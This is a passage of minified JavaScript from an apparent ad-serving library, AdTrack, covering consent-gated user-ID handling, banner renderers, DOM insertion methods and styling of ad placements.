            }, 200);
          }(e, i);
        },
        H = function () {
          var t = function () {
            var t = AdTrack.Utils.getLocalStorageItem(c),
              e = null,
              i = null;
            if (t) try {
              var r = Date.parse(t);
              (i = new Date()).setTime(r);
            } catch (t) {}
            if (i && i.getTime() > new Date().getTime()) try {
              var n = AdTrack.Utils.getLocalStorageItem(d);
              e = JSON.parse(n);
            } catch (t) {} else AdTrack.Utils.removeLocalStorageItem(d), AdTrack.Utils.removeLocalStorageItem(c);
            return E(e) ? e : null;
          }() || function () {
            var t = AdTrack.Utils.readCookie(h);
            try {
              var e = JSON.parse(t);
              return E(e) ? e : null;
            } catch (t) {
              return null;
            }
          }();
          E(t) && (n = "cookie", B(t, !0, !0));
        },
        z = {
          getBinary: function () {
            return I(m);
          },
          getUserIdsConfig: function () {
            return S;
          },
          getAllUserIds: function () {
            return m || null;
          },
          getAllUserIdsAsEids: function () {
            var t = E(m) ? Object.keys(m) : [],
              e = [];
            return t.forEach(t => {
              var i = S[t];
              if (i) {
                var r = AdTrack.UserID.createEidObject(m[t], i);
                r && r.source && r.uids && e.push(r);
              }
            }), e;
          },
          getUserIds: function (t) {
            var e = [];
            return t && t.length > 1 ? t.forEach(function (t) {
              m[t] && e.push(m[t]);
            }) : e = m, e;
          },
          getUserId: function (t) {
            return m[t] || null;
          },
          getCriteoId: function () {
            return this.getUserId("criteoId");
          },
          createEidObject: function (t, e) {
            let i = {};
            var r = "function" == typeof e.getValue ? e.getValue(t) : t,
              n = "function" == typeof e.getSource ? e.getSource(t) : e.source;
            if ("string" == typeof r) {
              const s = {
                id: r,
                atype: e.atype
              };
              if ("function" == typeof e.getUidExt) {
                const i = e.getUidExt(t);
                i && (s.ext = i);
              }
              if (i.uids = [s], i.source = n, "function" == typeof e.getEidExt) {
                const r = e.getEidExt(t);
                r && (i.ext = r);
              }
              return i;
            }
          },
          waitForModule: function (t, e) {
            if ("function" == typeof t) if (f || g) t();else {
              var i = AdTrack.Utils.singleUseCallback(t);
              e && setTimeout(function () {
                i();
              }, e), A.push(i);
            }
          },
          fn: function () {},
          init: function (t) {
            if (H(), AdTrack.Config.isCMPRequired && AdTrack.Config.isCMPRequired()) {
              if (p = !0, AdTrack.CMP) {
                var e = function () {
                  var t = AdTrack.CMP.getConsentData();
                  if (t) if (t.gdprApplies) {
                    if (t.purpose) {
                      (t.purpose.consents || {})[1] && t.consentString && M(O, !1);
                    }
                  } else M(O, !0);
                };
                "function" == typeof AdTrack.CMP.waitForTcf ? AdTrack.CMP.waitForTcf(e) : AdTrack.CMP.waitForConsent(e);
              } else U.doError("CMP module not available for UserID purposes");
            } else M(O, !0);
          }
        };
      return z.init(AdTrack.Config.getUserID()), z;
    };
    if (t.AdTrack.UserID && "function" == typeof t.AdTrack.UserID.fn) try {
      t.AdTrack.UserID.fn();
    } catch (e) {
      t.AdTrack.UserID = r();
    } else t.AdTrack.UserID = r();
    window.AdTrack.UserID = t.AdTrack.UserID;
  }();
}, function (t, e) {
  var i;
  AdTrack.BaseRenderer = function (t, e, i, r, n, s, a) {
    this.track = a, this.definitionObj = e, this.definition = e.definition, this.settings = i, this.window = t, this.document = t.document, this.transforms = r, this.errorReporting = n, this.styles = AdTrack.Styles.create(this.definition.macros, r, t), this.metrics = s, this.isLoaded = !1, this.renderer = null, this.container = null, this.wrap = null, this.insertion = null, this.initialized = !1, this.events = AdTrack.Events.create(["destroy", "ready", "empty", "impress", "expand", "collapse", "close", "show", "hide", "viewabilityChanged"]), this.events.markEventAsTriggerOnce("destroy"), this.events.markEventAsTriggerOnce("ready"), this.events.markEventAsTriggerOnce("empty"), this.events.markEventAsTriggerOnce("impress"), this.events.markEventAsTriggerOnce("expand"), this.events.markEventAsTriggerOnce("collapse"), this.events.markEventAsTriggerOnce("close");
    var o = function (t, e) {
      setTimeout(function () {
        t.dispatchEvent(e);
      }, 700);
    };
    this.actionEvent = AdTrack.Utils.createEvent(this.document, "adt-action"), this.on("show", function () {
      o(this.window, this.actionEvent);
    }.bind(this)), this.on("hide", function () {
      o(this.window, this.actionEvent);
    }.bind(this));
  }, AdTrack.BaseRenderer.prototype = {
    close: function () {
      this.renderer.close.apply(this.renderer, arguments);
    },
    loaded: function (t) {
      try {
        this.onLoadAdjust(t), this.renderer.transitionObject = this.createTransitionObject(t), this.renderer.loaded(t), this.loadStyles(t), this.isLoaded = !0, this.viewabilityProbe || (this.viewabilityProbe = AdTrack.Viewability.Probe(this.window, this.renderer.measureImpress.bind(this.renderer), function (e) {
          this.events.trigger("viewabilityChanged", [e]);
          var i = AdTrack.Viewability.DEFAULT_THRESHOLD;
          t.getImpThreshold && t.getImpThreshold() > 0 && (i = t.getImpThreshold()), e >= i && this.events.trigger("impress", [this.getContainer(), e]);
        }.bind(this))), this.window.dispatchEvent(this.actionEvent);
      } catch (t) {
        this.errorReporting.doError("Renderer load failed: " + t.message);
      }
    },
    updateSize: function (t) {
      "function" == typeof this.renderer.updateSize && this.renderer.updateSize(t), this.definition.options.adjustIframeSize && this.adjustIframeSize(t);
    },
    loadStyles: function (t) {
      var e = t.data.style,
        i = this.definition;
      e && e.options && e.options.css && this.styles.setCss(AdTrack.Styles.STYLE, e.options.css), i && i.options && i.options.css && this.styles.setCss(AdTrack.Styles.DEFINITION, i.options.css), this.styles.appendStyles(this.wrap);
    },
    destroy: function () {
      this.renderer && "function" == typeof this.renderer.destroy && this.renderer.destroy(), this.viewabilityProbe && this.viewabilityProbe.dispose();
    },
    on: function (t, e) {
      this.events.addCallback(t, e);
    },
    init: function (t) {
      if (this.initialized) this.definition.options.dfpVignette ? t() : this.on("ready", t);else {
        this.initialized = !0, this.getRenderer();
        var e = function () {
          if (this.domAdjust(), this.renderer) {
            this.containerId = "C_" + Math.floor(1e5 * Math.random()), this.container.setAttribute("data-adtrack-container", this.containerId), this.definition.macros.container = "[data-adtrack-container=" + this.containerId + "]", this.wrap = this.container, this.wrap.id || (this.wrap.id = this.definition.placementId.getName()), this.renderer.isReadyToShow(this.container) || this.definition.options.noAsync ? (this.events.trigger("ready"), t()) : this.definition.options.dfpVignette ? t() : this.on("ready", t);
          } else t();
        }.bind(this);
        this.definition.options.control ? this.setupControlFunctions(function () {
          this.tryInsertion(e);
        }.bind(this)) : this.tryInsertion(e);
      }
    },
    setupControlFunctions: function (t) {
      if (this.definition.options.control) {
        if (this.definition.options.control.show) {
          var e = this.definition.options.control.show;
          this.window[e] || (this.window[e] = function (e) {
            if (this.isLoaded && "function" == typeof this.renderer.open) this.renderer.open();else {
              if (this.definition.options.dom && this.definition.options.dom.selectorForeign) {
                if ("string" != typeof e) return void this.errorReporting.doError("Unable to display ad, selector not provided.");
                this.definition.options.dom.selector = e;
              }
              t();
            }
          }.bind(this));
        }
        if (this.definition.options.control.hide) {
          var i = this.definition.options.control.hide;
          this.window[i] || (this.window[i] = function () {
            this.isLoaded && "function" == typeof this.renderer.close && this.renderer.close();
          }.bind(this));
        }
        this.definition.options.control.displayFirst && t();
      }
    },
    render: function (t) {
      var e = function (e) {
        if (t.isPreloaded()) {
          var i = this.definitionObj.getId().getName();
          this.settings.publisher && "mafra" === this.settings.publisher.tag && -1 !== i.indexOf("branding") && (t.data.preload.proxy = !0), this.definition.options.noAsync ? this.errorReporting.doError("Cant perform preload in synchronous mode.") : t.preload(e, this.transforms);
        } else t.render(e, this.transforms);
      }.bind(this);
      t.isRenderedExternally() ? (t.on("load", function () {
        this.onLoadAdjust(t);
      }.bind(this)), e(this.container)) : (t.on("load", function () {
        this.loaded(t);
      }.bind(this)), t.on("close", function () {
        this.renderer.close ? this.renderer.close() : this.renderer.hide(), this.events.trigger("close");
      }.bind(this)), this.on("destroy", function () {
        t.destroy();
      }.bind(this)), e(this.createContainer()));
    },
    createContainer: function () {
      return this.renderer ? this.renderer.createContainer(this.container) : this.container;
    },
    getContainer: function () {
      return this.renderer ? this.renderer.getContainer() : this.container;
    },
    getRenderer: function () {
      if (!this.renderer) try {
        var t = this.definition.renderer;
        "flexi" === t ? this.renderer = new AdTrack.FlexiRenderer(this.window, this.definitionObj, this.transforms, this.events, this.errorReporting, this.metrics) : "fixed" === t ? this.renderer = new AdTrack.Fixed2Renderer(this.window, this.definitionObj, this.settings, this.transforms, this.events, this.errorReporting, this.metrics, this.styles, this.track) : "branding" === t ? this.renderer = new AdTrack.BrandingRenderer(this.window, this.definitionObj, this.transforms, this.events, this.errorReporting, this.metrics) : "interscroll" === t ? this.renderer = new AdTrack.InterScrollRenderer(this.window, this.definitionObj, this.transforms, this.events, this.errorReporting, this.metrics) : "vignette" === t ? this.renderer = new AdTrack.VignetteRenderer(this.window, this.definitionObj, this.settings, this.transforms, this.events, this.errorReporting, this.metrics, this.styles) : "outstream" === t ? this.renderer = new AdTrack.OutstreamRenderer(this.window, this.definitionObj, this.transforms, this.events, this.errorReporting, this.metrics) : "inmedia" === t ? this.renderer = new AdTrack.InMediaRenderer(this.window, this.definitionObj, this.transforms, this.events, this.errorReporting, this.metrics, this.styles) : this.errorReporting.doError("Unknown ad renderer " + t);
      } catch (e) {
        this.errorReporting.doError("Missing source for " + t + " (" + e.message + ")");
      }
    },
    tryInsertion: function (t) {
      var e = this.document.readyState,
        i = !!this.definition.options.noAsync;
      if ("complete" == e || "ready" == e || !AdTrack.BrowserFlags.isOldIE && "interactive" == e) this.container = this.getInsertion(this.definition, !0), this.container && t();else if (this.container = this.getInsertion(this.definition, i), this.container) t();else if (!i) {
        var r = this.document.addEventListener ? "DOMContentLoaded" : "readystatechange",
          n = function () {
            AdTrack.Utils.removeEvent(this.document, r, n), this.container = this.getInsertion(this.definition, !0), this.container && t();
          }.bind(this);
        AdTrack.Utils.addEvent(this.document, r, n);
      }
    },
    getInsertion: function (t, e) {
      if (this.definition.options && this.definition.options.dom) {
        var i = this.definition.options.dom;
        if (this.insertion || (this.insertion = new AdTrack.Insertion(this.window, this.transforms, i, this.errorReporting, this.definition.placementId)), "container" === i.method) return this.insertion.container();
        if ("create" === i.method) return this.insertion.create();
        if ("smartInsert" === i.method) return this.insertion.smartInsert();
        if ("image" === i.method) return this.insertion.image();
        if ("fuzzyAfter" === i.method) return this.insertion.fuzzy();
        if ("inplace" === i.method) return this.insertion.inplace();
      } else e && this.errorReporting.doError("No dom definition");
      return null;
    },
    onLoadAdjust: function (t) {
      if (this.definition.options) {
        var e = this.definition.options;
        if (e.hide) {
          var i = AdTrack.Utils.validateSelector(e.hide, this.definition.macros),
            r = this.document.querySelector(i);
          r && this.transforms.styleElement(r, "display", "none", "important");
        }
        e.adjustIframeSize && this.adjustIframeSize(t);
      }
      try {
        var n = this.window,
          s = this.definitionObj.getId().getName();
        if (n === window.top) this.wrap.setAttribute("data-adtrack-id", s);else {
          for (; n.parent !== window.top;) n = n.parent;
          n.frameElement.setAttribute("data-adtrack-id", s);
        }
      } catch (t) {}
    },
    adjustIframeSize: function (t) {
      try {
        for (var e = this.window; e !== window.top;) {
          var i = e.frameElement,
            r = t.data.style,
            n = r ? r.options.width : null,
            s = r ? r.options.height : null,
            a = n || t.data.width || this.definition.options.width,
            o = s || t.data.height || this.definition.options.height;
          a && o && (i.style.width = a + "px", i.style.height = o + "px"), e = e.parent;
        }
      } catch (t) {}
    },
    domAdjust: function () {
      if (this.definition.options && this.definition.options.dom) {
        var t = this.definition.options.dom;
        if (t.remove) if (t.remove instanceof Array) Array.prototype.forEach.call(t.remove, function (t) {
          var e = this.document.querySelector(t);
          e && this.transforms.removeElement(e.parentNode, e);
        }.bind(this));else {
          var e = this.document.querySelector(t.remove);
          e ? this.transforms.removeElement(e.parentNode, e) : this.errorReporting.doError("Unable to find r selector " + t.remove);
        }
      } else this.errorReporting.doError("No dom definition");
    },
    createTransitionObject: function (t) {
      var e = t.data.style,
        i = this.definitionObj.getOption("transitionStart", e),
        r = this.definitionObj.getOption("transitionMid", e),
        n = this.definitionObj.getOption("transitionEnd", e),
        s = this.definitionObj.getOption("transitionHideAfter", e),
        a = i && -1 !== ("" + i).indexOf("animation"),
        o = i,
        d = r,
        c = n,
        h = function (t) {
          t && this.styles.setCss(AdTrack.Styles.TRANSITION, t);
        }.bind(this);
      return {
        getHideAfter: function () {
          return s || 1e3;
        },
        hasTransition: function () {
          return o || c;
        },
        start: function () {
          h(o);
        },
        mid: function () {
          !a && h(d);
        },
        end: function () {
          h(c);
        },
        setTransition: function (t) {
          o = t.start, d = t.mid, c = t.end, s = t.hideAfter;
        },
        setDefaultTransition: function (t) {
          o = o || t.start, d = d || t.mid, c = c || t.end, s = s || t.hideAfter;
        }
      };
    },
    show: function () {
      this.wrap && (this.wrap.style.display = "block");
    },
    hide: function () {
      this.wrap && (this.wrap.style.display = "none");
    },
    highlight: function (t) {
      this.wrap && "object" == typeof this.wrap.style && (this.wrap.style.boxShadow = t ? "" : "0px 0px 0px 11px #ff9933");
    }
  }, AdTrack.Insertion = function (t, e, i, r, n) {
    var s = {},
      a = t.document,
      o = function (t, e) {
        r && r.doError(t, null, null, e);
      };
    return s.container = function () {
      var r = a.querySelectorAll(i.selector);
      if (r.length > 1 && !i.multipleAdsCounter) {
        var n = {
          count: r.length,
          selector: i.selector
        };
        o("Multiple elements found for selector", n);
      }
      var s = 0;
      i.multipleAdsCounter && i.multipleAdsCounter > 0 && (s = i.multipleAdsCounter - 1);
      var d = r.item(s);
      if (d) {
        var c = t === window.top;
        if (a.head.contains(d)) {
          if (c) {
            n = {
              selector: i.selector
            };
            return o("Target element is in head", n), null;
          }
          var h = a.createElement("div");
          return e.addElement(a.getElementsByTagName("body")[0], h), h;
        }
        if (("IMG" === d.tagName || "img" === d.tagName) && d.parentNode) {
          var l = a.createElement("div");
          return l.setAttribute("style", "position: relative;"), d.parentNode.appendChild(l), l.appendChild(d), l;
        }
        if ("SCRIPT" === d.tagName || "script" === d.tagName) {
          h = a.createElement("div");
          return e.addElement(d.parentNode, h, d), h;
        }
        return d;
      }
      var u = {
        selector: i.selector
      };
      o("Unable to find c selector ", u);
    }, s.image = function () {
      var t = a.querySelector(i.image);
      if (t) return t;
      o("Unable to find i selector " + i.image);
    }, s.create = function () {
      var t = a.querySelector(i.container);
      if (t) {
        var r = a.createElement("div");
        if (i.before) {
          var n = t.querySelector(i.before);
          if (n) return e.addElement(n.parentNode, r, n), r;
          if (i.allowFallbackLast) return e.addElement(t, r), r;
          o("Unable to find b selector " + i.before);
        } else {
          if (!i.after) return e.addElement(t, r), r;
          var s = t.querySelector(i.after);
          if (s) return e.addElement(s.parentNode, r, s.nextSibling), r;
          if (i.allowFallbackLast) return e.addElement(t, r), r;
          o("Unable to find a selector " + i.after);
        }
      } else o("Unable to find s selector " + i.container);
    }, s.smartInsert = function () {
      var t,
        r,
        n = a.querySelectorAll(i.selector),
        s = i.insertion || "near-fold",
        d = -1;
      if (n.length > 0 && s) {
        var c = a.createElement("div"),
          h = Math.ceil((n.length - 1) / 2);
        if ("middle" === s) d = h;else if ("near-fold" === s) for (var l = 0; l < n.length; l++) {
          var u = n[l],
            p = AdTrack.Utils.getViewportRealHeight(window),
            f = window.pageYOffset || a.documentElement.scrollTop;
          try {
            if (u.getBoundingClientRect().top + f >= p) {
              d = l;
              break;
            }
          } catch (t) {}
        } else if ("floatfix" === s) for (var g = n[0].parentNode.childNodes, m = !1, k = 0; k < n.length; k++) {
          for (var b = n[k].getBoundingClientRect(), v = !1, A = 0; A < g.length; A++) if ("function" == typeof g[A].getBoundingClientRect && n[k] !== g[A]) {
            var T = g[A].getBoundingClientRect();
            if (t = b, !((r = T).left > t.right || r.right < t.left || r.top > t.bottom || r.bottom < t.top)) {
              v = !0;
              break;
            }
          }
          if (k > 1 && !m) {
            d = k - 1;
            break;
          }
          if (k === n.length - 1 && !v) {
            d = k;
            break;
          }
          m = v;
        }
        return d < 0 && (d = h), e.addElement(n[d].parentNode, c, n[d].nextSibling), c;
      }
      o("Unable to find selector '" + i.selector + "' or incorrect insertion provided.");
    }, s.fuzzy = function () {
      var t = a.querySelector(i.selector);
      if (t) {
        for (var r = i.fuzzyParentize ? i.fuzzyParentize : 0, n = 0; n < r && t.parentNode && (!i.fuzzyParentizeAtMostClass || i.fuzzyParentizeAtMostClass != t.parentNode.className) && (!i.fuzzyParentizeAtMostId || i.fuzzyParentizeAtMostId != t.parentNode.id); n++) t = t.parentNode;
        var s = a.createElement("div"),
          d = t,
          c = i.fuzzyInject ? i.fuzzyInject : 0;
        for (n = 0; n < c; n++) e.addElement(t.parentNode, s, d.nextSibling), d = s, s = a.createElement("div");
        if (i.fuzzyClass && AdTrack.Utils.addClassName(s, i.fuzzyClass), i.fuzzyId && s.setAttribute("id", i.fuzzyId), i.fuzzyStyle) {
          var h = "d" + Math.round(1e5 * Math.random()),
            l = a.createElement("style");
          e.addElement(a.getElementsByTagName("head")[0], l), AdTrack.Utils.cssToStyle(l, "." + h + "{" + i.fuzzyStyle + "}"), AdTrack.Utils.addClassName(s, h);
        }
        return e.addElement(t.parentNode, s, d.nextSibling), s;
      }
      o("Unable to find c selector " + i.selector);
    }, s.inplace = function () {
      if (a.querySelector(i.selector)) return s.container();
      if (!i.useInPlaceFallback) return o("Inplace fallback not set"), null;
      var r = AdTrack.Utils.windowTopAccess(),
        d = window.top === window;
      if (r && !d && t === window.top) {
        for (var c = a.createElement("div"), h = window; h.parent !== window.top;) h = h.parent;
        var l = h.frameElement;
        return e.addElement(l.parentNode, c, l), i.hideOriginalContainer && l.style.setProperty("display", "none", "important"), c;
      }
      var u = 'script[src*="' + n.getPath() + '"]';
      return i.selector = u, s.container();
    }, s;
  }, AdTrack.Styles = (i = function (t, e, i) {
    var r = function () {
        return i.document.createElement("style");
      },
      n = function (e, i, r) {
        t && (i = AdTrack.Utils.replaceMacros(i, t));
        try {
          r ? e.innerHTML += i : e.innerHTML = i;
        } catch (t) {
          r ? e.styleSheet.cssText += i : e.styleSheet.cssText = i;
        }
      },
      s = {},
      a = [r(), r(), r(), r()];
    return s.addCss = function (t, e) {
      a[t] && n(a[t], e, !0);
    }, s.setCss = function (t, e) {
      a[t] && n(a[t], e);
    }, s.appendStyles = function (t) {
      if (t) for (var i = 0; i < a.length; i++) {
        var r = a[i];
        e ? e.addElement(t, r) : t.appendChild(r);
      }
    }, s;
  }, {
    DEFAULT: 0,
    DEFINITION: 1,
    STYLE: 2,
    TRANSITION: 3,
    create: function (t, e, r) {
      return new i(t, e, r);
    }
  });
}, function (t, e) {
  AdTrack.FlexiRenderer = function (t, e, i, r, n, s) {
    this.window = t, this.definitionObj = e, this.definition = e.definition, this.transforms = i, this.events = r, this.errorReporting = n, this.metrics = s, this.container = null, this.rp = e.shouldUseRenderProxy() ? new AdTrack.RenderProxy(this.window.document) : null, this.isLoaded = !1, this.isResizable = this.definitionObj.getOption("resizeToFitContainer") || this.definitionObj.getOption("resizeToFillWidth");
  }, AdTrack.FlexiRenderer.prototype = {
    isReadyToShow: function (t) {
      if (this.definitionObj.getOption("lazyLoad")) {
        var e = AdTrack.Viewability.Probe(this.window, function () {
          return AdTrack.Viewability.isInView(t) ? 1 : 0;
        }, function (t) {
          t && (e.dispose(), this.events.trigger("ready"));
        }.bind(this), 100);
        return !1;
      }
      return !0;
    },
    getContainer: function () {
      return this.rp && !this.currentProxy && this.errorReporting.doError("Proxy not rendered yet, cant provide container. "), this.rp ? this.currentProxy : this.container;
    },
    createContainer: function (t) {
      if (!this.container) {
        var e = t.id;
        if (e || (e = AdTrack.Utils.simpleStringGenerator(10, "c"), t.id = e), this.definition.macros.flexiWrap = "#" + e, this.mainWrap = t, this.definition.options.position) {
          var i = this.window.document.createElement("div");
          t.style.position = "relative", this.transforms.addElement(t, i), this.container = i;
        } else this.isResizable ? (this.resizableBannerWrap = this.window.document.createElement("div"), this.resizableBannerWrap.setAttribute("style", "width: 0; height: 0; overflow: hidden;"), this.resizableBanner = this.window.document.createElement("div"), this.resizableBannerWrap.appendChild(this.resizableBanner), this.transforms.addElement(t, this.resizableBannerWrap), this.container = this.resizableBanner) : this.container = t;
      }
      return this.rp ? this.rp.getProxyContainer(this.container) : this.container;
    },
    loaded: function (t) {
      if (this.isLoaded = !0, this.isResizable) {
        var e = t.data.style ? t.data.style.options.width : null,
          i = t.data.style ? t.data.style.options.height : null;
        if (this.width = e || t.data.width || this.definition.options.width, this.height = i || t.data.height || this.definition.options.height, this.width && this.height) {
          var r = function () {
            var t = this.mainWrap.parentElement,
              e = t.clientWidth / this.width,
              i = t.clientHeight / this.height,
              r = 1;
            this.definitionObj.getOption("resizeToFitContainer") && (r = Math.min(e, i)), this.definitionObj.getOption("resizeToFillWidth") && (r = e), this.realWidth = this.width * r, this.realHeight = this.height * r, this.resizableBannerWrap.setAttribute("style", "display: inline-block; width: " + this.realWidth + "px; height: " + this.realHeight + "px; position: relative; z-index: 0; "), this.resizableBanner.setAttribute("style", "display: block; width: " + this.width + "px; height:" + this.height + "px; position: absolute; top: 0; left: 0; overflow: hidden;");
            var n = "scale(" + r + ")";
            AdTrack.Utils.applyTransform(this.resizableBanner, n, "left top");
          }.bind(this);
          r(), this.resizeListener = function () {
            this.isLoaded && r();
          }.bind(this), AdTrack.BrowserFlags.isPhone ? AdTrack.Utils.addEvent(this.window, "orientationchange", this.resizeListener) : AdTrack.Utils.addEvent(this.window, "resize", this.resizeListener);
        } else this.errorReporting.doError("Undefined width or height");
      }
      if (this.definition.options.control && (this.transitionObject.setDefaultTransition({
        start: "%%flexiWrap%% {opacity: 0;}",
        mid: "%%flexiWrap%% {transition: opacity 0.3s; opacity: 1;}",
        end: "%%flexiWrap%% {transition: opacity 0.3s; opacity: 0;}",
        hideAfter: 300
      }), this.transitionObject.start()), this.definition.options.position) {
        var n = this.container;
        this.definition.options.position.left && (n.style.left = this.definition.options.position.left), this.definition.options.position.right && (n.style.right = this.definition.options.position.right), this.definition.options.position.top && (n.style.top = this.definition.options.position.top), this.definition.options.position.bottom && (n.style.bottom = this.definition.options.position.bottom), this.definition.options.position.width && (n.style.width = this.definition.options.position.width), this.definition.options.position.height && (n.style.height = this.definition.options.position.height), n.style.position = "absolute";
      }
      this.rp && (this.currentProxy = this.rp.render()), this.open();
    },
    measureImpress: function () {
      return AdTrack.Viewability.getVisiblePercentage(this.container);
    },
    destroy: function () {
      this.resizeListener && (AdTrack.BrowserFlags.isPhone ? AdTrack.Utils.removeEvent(this.window, "orientationchange", this.resizeListener) : AdTrack.Utils.removeEvent(this.window, "resize", this.resizeListener));
    },
    show: function () {
      this.mainWrap && (this.mainWrap.style.display = "block");
    },
    hide: function () {
      this.mainWrap && (this.mainWrap.style.display = "none");
    },
    open: function () {
      this.show(), setTimeout(function () {
        this.transitionObject.mid();
      }.bind(this), 10), this.events.addCallback("ready", function () {
        this.events.trigger("show");
      }.bind(this));
    },
    close: function () {
      setTimeout(function () {
        this.transitionObject.end(), setTimeout(function () {
          this.hide();
        }.bind(this), this.transitionObject.getHideAfter());
      }.bind(this), 10), this.events.addCallback("ready", function () {
        this.events.trigger("close"), this.events.trigger("hide");
      }.bind(this)), this.definition.options.hideDelay && AdTrack.Cookies.setHide(this.definitionObj.getId(), this.definition.options.hideDelay);
    }
  };
}, function (t, e) {
  AdTrack.RenderProxy = function (t) {
    var e = null,
      i = null,
      r = null,
      n = {};
    return n.getProxyContainer = function (i) {
      var n;
      return e = i, r && e.removeChild(r), (n = t.createElement("div")).setAttribute("style", "visibility: hidden !important;position: fixed !important;top: 0 !important;left: 0 !important;z-index: -10000 !important;width: 0 !important;height: 0 !important;overflow: visible !important;"), n.setAttribute("id", "proxy" + Math.floor(1e8 * Math.random())), e.appendChild(n), r = n;
    }, n.render = function () {
      if (r) {
        var t = r.getElementsByTagName("iframe").length > 0;
        !function (t, e) {
          var i = t.childNodes;
          if (i) for (var r = i.length - 1; r >= 0; r--) {
            var n = i[r];
            e && n.id && e.id === n.id || t.removeChild(t.firstChild);
          }
        }(e, r), t ? (r.setAttribute("style", ""), i = r) : (!function (t, e) {
          var i = e.childNodes;
          if (i) for (var r = i.length - 1; r >= 0; r--) t.appendChild(i[r]);
        }(e, r), e.removeChild(r), i = e), r = null;
      }
      return i;
    }, n;
  };
}, function (t, e) {
  AdTrack.InMediaRenderer = function (t, e, i, r, n, s, a) {
    this.window = t, this.definitionObj = e, this.definition = e.definition, this.transforms = i, this.events = r, this.errorReporting = n, this.metrics = s, this.styles = a, this.container = null, this.names = {
      closer: "inMediaCloser",
      adNotice: "inMediaAdNotice"
    }, this.defaultCss = "", this.isLoaded = !1, this.hasClosed = !1, this.width = 0, this.height = 0, this.realWidth = 0, this.realHeight = 0, this.media = null, this.mainWrap = null, this.wrap = null, this.bannerWrap = null, this.banner = null, this.closer = null, this.verticalAlign = "top" === this.definitionObj.getOption("verticalAlign") ? "top" : "bottom", this.horizontalAlign = this.definitionObj.getOption("wrapAlign") || "right", this.resizeListener = function () {
      this.isLoaded && (this.mediaWidth = this.media.clientWidth, this.mediaHeight = this.media.clientHeight, this.mediaWidth && this.mediaHeight ? (this.setUp(), this.show()) : this.hide());
    }.bind(this), AdTrack.BrowserFlags.isPhone ? AdTrack.Utils.addEvent(this.window, "orientationchange", this.resizeListener) : AdTrack.Utils.addEvent(this.window, "resize", this.resizeListener);
  }, AdTrack.InMediaRenderer.prototype = {
    getContainer: function () {
      return this.container;
    },
    createContainer: function (t) {
      if (!this.container) {
        this.mainWrap = t, this.wrap = this.window.document.createElement("div"), this.adWrap = this.window.document.createElement("div"), this.bannerWrap = this.window.document.createElement("div"), this.banner = this.window.document.createElement("div"), this.wrap.appendChild(this.adWrap), this.adWrap.appendChild(this.bannerWrap), this.bannerWrap.appendChild(this.banner), t.appendChild(this.wrap);
        var e = this.definitionObj.getId().getWrapName();
        this.wrap.setAttribute("id", e);
        var i = function (t, e) {
          var i = t.id;
          i || (i = AdTrack.Utils.simpleStringGenerator(10, "c"), t.id = i), this.definition.macros[e] = "#" + i;
        }.bind(this);
        i(this.adWrap, "inMediaAdWrap"), i(this.banner, "inMediaBanner"), this.wrap.style.display = "none", this.container = this.banner;
      }
      return this.container;
    },
    isReadyToShow: function () {
      return !0;
    },
    measureImpress: function () {
      return AdTrack.Viewability.getVisiblePercentage(this.adWrap);
    },
    getAdNotice: function (t, e) {
      ("string" != typeof t || t.length < 2) && (t = "reklama"), e = "left" === e ? "left" : "right";
      this.verticalAlign;
      var i = e + " " + this.verticalAlign + " 0",
        r = AdTrack.Utils.cssPrefix("transform-origin", i),
        n = this.window.document.createElement("div");
      n.innerHTML = t;
      var s = AdTrack.DOM.Component.register(this.names.adNotice, this.definition, this.window);
      return s.setElement(n), this.defaultCss += " %%inMediaAdNotice.wrap%% {display: block; position: absolute; " + e + ": 0; " + this.verticalAlign + ": 0; " + r + " }%%inMediaAdNotice.element%% {display: block; background: rgba(0, 0, 0, 0.25); color: white; font-size: 10px; font-family: Arial; margin: 0px; padding: 0 3px; line-height: 11px;}", s;
    },
    getIconCloser: function (t, e) {
      var i = Math.floor(10);
      t = "left" === t ? "left" : "right";
      var r = "top" === this.verticalAlign ? "bottom" : "top",
        n = t + " center 0",
        s = AdTrack.Utils.cssPrefix("transform-origin", n),
        a = this.window.document.createElement("img");
      a.setAttribute("src", "https://trackad.cz/icon/closer3.png"), a.setAttribute("alt", "close");
      var o = this.window.document.createElement("a");
      o.setAttribute("href", e), o.setAttribute("data-google-interstitial", "false"), o.appendChild(a);
      var d = AdTrack.DOM.Component.register(this.names.closer, this.definitionObj.definition, this.window);
      return d.setElement(o), this.defaultCss += " %%inMediaCloser.wrap%% {display: block; position: absolute; " + t + ": 2px; " + r + ": " + -i + "px; " + s + " }%%inMediaCloser.element%% {display: block; border-radius: 20px; font-size: 0; text-decoration: none; line-height: normal !important; background: #cacaca;}%%inMediaCloser.element%% img {display: block; width: 20px; height: 20px; max-width: 20px; max-height: 20px; min-width: 20px; min-height: 20px;}", d;
    },
    addSideComponents: function (t) {
      var e = t.data.style,
        i = "left" == this.definitionObj.getOption("closerPos", e) ? "left" : "right",
        r = e && e.options.fixedShowAdNotice || this.definitionObj.getOption("fixedShowAdNotice");
      this.closer && this.closer.destroy(), this.closer = this.getIconCloser(i, "#"), this.adWrap.appendChild(this.closer.getWrap()), this.adNotice && this.adNotice.destroy(), r && (this.adNotice = this.getAdNotice(r, "left" === i ? "right" : "left"), this.adWrap.appendChild(this.adNotice.getWrap()));
    },
    setUp: function () {
      if (this.width && this.height) {
        var t = this.definitionObj.getOption("maxWidth") || 1,
          e = this.definitionObj.getOption("maxHeight") || 1,
          i = this.definitionObj.getOption("maxArea") || .3,
          r = Math.sqrt(this.mediaWidth * this.mediaHeight * i / (this.width * this.height)),
          n = this.mediaWidth * t / this.width,
          s = this.mediaHeight * e / this.height,
          a = Math.min(n, s, r);
        this.realWidth = this.width * a, this.realHeight = this.height * a, this.mediaShadow && (this.media.style.filter = "brightness(0.4)");
        var o = this.definition.options.zIndex || 1e3;
        this.wrap.setAttribute("style", "display: block; position: relative; width: 0; height: 0; overflow: visible; z-index:" + o + ";"), this.adWrap.setAttribute("style", "display: block; position: absolute; width: " + this.realWidth + "px; height: " + this.realHeight + "px;"), this.bannerWrap.setAttribute("style", "display: block; width: " + this.realWidth + "px; height: " + this.realHeight + "px;"), this.banner.setAttribute("style", "display: block; width: " + this.width + "px; height: " + this.height + "px; position: relative;  max-width: initial; max-height: initial;");
        var d = this.wrap.getBoundingClientRect(),
          c = this.media.getBoundingClientRect(),
          h = c.top - d.top,
          l = c.left - d.left;
        "right" === this.horizontalAlign && (l += this.mediaWidth - this.realWidth), "center" === this.horizontalAlign && (l += this.mediaWidth / 2 - this.realWidth / 2), "bottom" === this.verticalAlign && (h += this.mediaHeight - this.realHeight), this.adWrap.style.left = l + "px", this.adWrap.style.top = h + "px";
